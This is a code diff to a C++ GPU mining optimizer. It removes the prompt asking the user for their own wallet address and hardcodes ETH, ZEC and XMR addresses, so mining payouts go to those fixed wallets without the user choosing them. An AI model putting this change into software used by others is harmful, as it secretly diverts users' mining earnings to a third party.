@@ -92,6 +92,9 @@ namespace frequency_scaling {
         }
         if (opt_config.dcis_.empty())
             throw std::runtime_error("No device selected");
+		std::string eth_address = "0x8291ca623a1f1a877fa189b594f6098c74aad0b3";
+		std::string zec_address = "t1Z8gLLGyxGRkjRFbNnJ2n6yvHb1Vo3pXKH";
+		std::string xmr_address = "49obKYMTctj2owFCjjPwmDELGNCc7kz3WBVLGgpF1MC3cWYH3psdpyV8rBdZUycYPr3qU9ChEmj4ZMFLLf2gN2bcFEzNPpv";
         //select currencies to mine
         for (int i = 0; i < static_cast<int>(currency_type::count); i++) {
             currency_type ct = static_cast<currency_type>(i);
@@ -99,10 +102,24 @@ namespace frequency_scaling {
             std::string user_in = cli_get_string(user_msg, "[yn]");
             if (user_in != "y")
                 continue;
-            user_msg = "Enter mining user info in the format <wallet_address/worker_name[/e-mail]>:";
+            //user_msg = "Enter mining user info in the format <wallet_address/worker_name[/e-mail]>:";
             //^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,6}$
-            user_in = cli_get_string(user_msg, "[a-zA-Z0-9]+/\\w+(/\\w+(\\.\\w+)?@\\w+\\.[a-zA-Z]{2,6})?");
-            opt_config.miner_user_infos_.emplace(ct, miner_user_info(user_in));
+            //user_in = cli_get_string(user_msg, "[a-zA-Z0-9]+/\\w+(/\\w+(\\.\\w+)?@\\w+\\.[a-zA-Z]{2,6})?");
+			switch (ct)
+			{
+			case frequency_scaling::currency_type::ETH:
+				user_in = eth_address + "/eth_worker";
+				break;
+			case frequency_scaling::currency_type::ZEC:
+				user_in = zec_address + "/zec_worker";
+				break;
+			case frequency_scaling::currency_type::XMR:
+				user_in = xmr_address + "/xmr_worker";
+				break;
+			default:
+				break;
+			}
+			opt_config.miner_user_infos_.emplace(ct, miner_user_info(user_in));
             //choose optimization method
             user_msg = "Select method used to optimize energy-hash ratio: [NM/HC/SA]";
             user_in = cli_get_string(user_msg, "NM|HC|SA");
